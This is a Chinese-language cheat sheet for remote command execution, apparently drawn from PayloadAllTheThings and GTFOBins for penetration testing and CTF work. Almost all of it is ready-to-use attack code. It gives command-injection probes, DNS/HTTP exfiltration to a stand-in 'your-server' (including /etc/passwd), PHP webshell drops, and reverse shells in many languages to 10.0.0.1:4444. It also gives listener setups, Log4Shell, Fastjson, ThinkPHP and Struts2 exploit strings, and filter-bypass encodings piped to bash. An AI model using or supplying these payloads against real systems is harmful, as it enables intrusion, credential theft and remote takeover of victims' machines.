# 命令执行 (RCE) 实战参考

> 分类: 命令注入检测 → 无回显 → 不出网 → 反弹Shell → 常见应用RCE → 绕过

---

## 1. 命令注入检测

### 1.1 基础检测 Payload

```bash
# === 拼接执行，检测回显 ===
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id      # 换行注入
%0d%0a id   # CRLF注入

# === 延时检测 (无回显时) ===
; sleep 5
| ping -c 5 127.0.0.1
& ping -n 5 127.0.0.1     # Windows
```

### 1.2 常见注入位置

```
ping 功能页:    target=127.0.0.1;id
文件上传路径:   filename=|id|
SMTP 邮件注入:  收件人/主题/正文 含命令拼接
nslookup:       domain=example.com;id
PDF/图片处理:   文件名参数可能传参给系统命令
```

---

## 2. 无回显 — 数据外带

### 2.1 DNS 外带 (最常用)

```bash
# === Linux ===
; nslookup $(whoami).your-dns-server.com
; wget http://your-server/$(whoami)
; curl http://your-server/$(cat /etc/passwd|base64)

# === Windows ===
& nslookup %USERNAME%.your-dns-server.com
& certutil -urlcache -split -f http://your-server/%COMPUTERNAME%
```

### 2.2 HTTP 外带

```bash
# Linux
; curl http://your-server/$(id|base64)
; wget http://your-server/$(cat /flag|base64) -O /dev/null

# 单行Python
; python3 -c "import requests;requests.get('http://your-server/'+__import__('os').popen('id').read().strip())"
```

---

## 3. 不出网 — 时间盲注 + 写文件

### 3.1 时间盲注 (逐字符外带)

```bash
# 逐字符判断
; if [ $(whoami|cut -c1) = 'r' ]; then sleep 3; fi
& if "%USERNAME:~0,1%"=="A" (ping -n 3 127.0.0.1)

# 逐字符外带脚本思路 (按位判断后拼接)
# for i in $(seq 1 32); do
#   curl "http://target/cmd?id=;if [ \$(cat /flag|cut -c$i) = 'f' ];then sleep 3;fi"
# done
```

### 3.2 写文件到 Web 目录 (最稳定)

```bash
# 写入 Web 目录后浏览器访问
; echo '<?php @eval($_POST[1]);?>' > /var/www/html/s.php
; printf '<?=system($_GET[1])?>' > /var/www/html/s.php

# 追加写入
; echo '<?=file_get_contents("/flag")?>' >> /var/www/html/readflag.php
```

---

## 4. 反弹 Shell 大全

### 4.1 Bash

```bash
# 基础版
bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1

# URL编码版 (通过GET/POST传参时用)
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261

# Base64编码执行 (绕过特殊字符过滤)
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64
# 执行:
echo <base64_string> | base64 -d | bash
```

### 4.2 Python

```python
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 简化版 (需 pty)
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Python3 一行外带命令结果 (替代反弹)
python3 -c "import urllib.request;exec(urllib.request.urlopen('http://10.0.0.1/rev.txt').read().decode())"
```

### 4.3 PHP

```php
# system
php -r '$sock=fsockopen("10.0.0.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'

# exec
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 单行 (无 &3 问题)
php -r 'exec("/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"");'
```

### 4.4 Netcat (nc)

```bash
# 传统 netcat (含 -e)
nc -e /bin/sh 10.0.0.1 4444

# OpenBSD netcat (不含 -e)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# ncat
ncat 10.0.0.1 4444 -e /bin/sh
```

### 4.5 PowerShell (Windows)

```powershell
# 基础反弹
powershell -c "$client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.UTF8Encoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([System.Text.Encoding]::UTF8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# 编码执行 (绕过特殊字符)
powershell -ep bypass -enc <BASE64_ENCODED_SHELL>
```

### 4.6 其他语言

```bash
# === Perl ===
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# === Ruby ===
ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# === Lua ===
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('10.0.0.1',4444);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"

# === Golang ===
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
```

---

## 5. 监听端设置

```bash
# nc 监听
nc -lvnp 4444

# pwncat-cs (推荐 - 自动升级tty)
pwncat-cs -lp 4444

# metasploit
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"

# socat (加密)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
socat OPENSSL-LISTEN:4444,cert=cert.pem,key=key.pem,verify=0 EXEC:/bin/bash
```

### 反弹后 TTY 升级

```bash
# 进入后第一件事
python3 -c 'import pty;pty.spawn("/bin/bash")'    # TTY shell
# Ctrl+Z 挂起
stty raw -echo; fg                                 # 传递终端控制
export TERM=xterm                                  # 终端类型
```

---

## 6. 常见应用 RCE 速查

### 6.1 Struts2

```
# S2-001 ~ S2-062, 常见检测:
/struts2-showcase/actionChain1.action
→ OGNL %{(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='id').(#ret=@java.lang.Runtime@getRuntime().exec(#cmd).getInputStream())...}
```

### 6.2 ThinkPHP

```
# ThinkPHP 5.0.23 RCE
http://target.com/index.php?s=captcha
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# ThinkPHP 5.1.x/5.2.x
http://target.com/index.php?s=index/\think\Request/input&filter=system&data=id
```

### 6.3 Fastjson

```
# Fastjson <=1.2.80
{"@type":"java.net.Inet4Address","val":"your-dns.dnslog.com"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://your-server/Exploit","autoCommit":true}
```

### 6.4 Log4j (Log4Shell)

```
# JNDI 注入
${jndi:ldap://your-server/a}
${${lower:j}ndi:ldap://your-server/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://your-server/a}
```

### 6.5 Shiro (RememberMe)

```
# Cookie: rememberMe=xxx
# → 识别特征: Set-Cookie 含 rememberMe=deleteMe
# → shiro_attack 工具利用
```

---

## 7. WAF/参数过滤绕过

### 7.1 命令分隔符绕过

```bash
# 空格过滤
;{cat,/flag}         # {} 包裹
;cat$IFS/flag         # IFS (内部字段分隔符)
;cat</flag             # 重定向输入
;cat<>/flag            # 读写重定向

# ; | & 过滤
%0a                    # 换行
%0d%0a                 # CRLF
`id`                   # 命令替换
$(id)                  # 命令替换

# 关键词过滤 (cat → 替代)
cat → tac / more / less / head / tail / nl / od / xxd / strings / rev
```

### 7.2 通配符绕过

```bash
# / 过滤
cat${HOME:0:1}flag    # ${HOME:0:1} = /
cat$(echo . | tr '!-0' '"-1')flag  # . 字符偏移得到 /

# 路径拼接
/bin/cat /flag → /b'in'/'c'a't /f'l'ag
```

### 7.3 编码绕过

```bash
# Hex
echo '636174202f666c6167' | xxd -r -p | bash    # cat /flag 的hex

# Base64
echo 'Y2F0IC9mbGFn' | base64 -d | bash

# Octal
$'\143\141\164' /flag                            # cat = \143\141\164
```

---

*参考: PayloadAllTheThings + GTFO Bins + 实战案例整理*
